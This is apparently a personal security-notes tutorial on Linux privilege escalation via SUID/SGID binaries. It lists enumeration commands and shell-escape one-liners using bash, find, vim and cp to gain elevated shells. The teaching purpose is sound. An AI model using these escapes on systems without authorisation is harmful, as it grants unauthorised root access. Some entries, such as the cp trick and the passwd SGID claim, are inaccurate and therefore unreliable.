## Linux Privilege Escalation - SUID & GUID

Linux privilege escalation through SUID (Set User ID) and SGID (Set Group ID) binaries is a common technique for gaining elevated privileges on a system. Both SUID and SGID are special permissions that allow users to execute a file with the permissions of the file owner (SUID) or the file group (SGID). This can lead to privilege escalation if these binaries are misconfigured or have vulnerabilities.

### Finding SUID and SGID Binaries
This command will list files that have SUID or SUID bits set:

```find / -type f -perm -04000 -ls 2>/dev/null``` 

![image](https://github.com/ankit-c/CyberSec/assets/25206084/f45eeb46-b2e0-4155-b93f-652c8c936769)

Finding SUID binaries:

```find / -perm -4000 -type f 2>/dev/null```

![image](https://github.com/ankit-c/CyberSec/assets/25206084/a5bcb047-8690-4c99-9d35-c0daca78a57a)

Finding GUID binaries:

```find / -perm -2000 -type f 2>/dev/null```

![image](https://github.com/ankit-c/CyberSec/assets/25206084/b6d6078d-ca0d-4af8-9385-c6129d42ebd1)

These commands search the entire filesystem (**/**) for files (**-type f**) with the SUID permission (**-perm -4000**) or the SGID permission (**-perm -2000**). The **2>/dev/null** part redirects error messages to **/dev/null** to suppress permission denied errors.

### Exploiting Common SUID and SGID Binaries

- ```bash```
  
  If the ```bash``` binary has the SUID bit set:
  
    ```bash -p```

  The -p option tells bash to not drop its privileges, maintaining the elevated privileges of the SUID owner.

- ```find```

  If the find binary has the SUID bit set:

    ```find . -exec /bin/sh \; -quit```

  This command executes /bin/sh with the privileges of the SUID owner.

- ```vim``` or ```vi```:

  If vim or vi has the SUID bit set:
  
    ```vim -c ':!/bin/sh'```

  This opens a shell with elevated privileges.

- ```cp```:

  If cp has the SUID bit set, you can copy a shell to a location where you can execute it with elevated privileges:
  
    ```
    cp /bin/sh /tmp/sh
    chmod +s /tmp/sh
    /tmp/sh
    ```
  This opens a shell with elevated privileges.

#### SGID Binaries

- ```newgrp```
  The newgrp command can be used to change the current group ID during a login session. If it has the SGID bit set, it can be used to escalate privileges:

    ```newgrp <groupname>```

- ```passwd```
  The ```passwd``` command often has the SGID bit set to allow users to change their passwords. If misconfigured, it can be exploited.
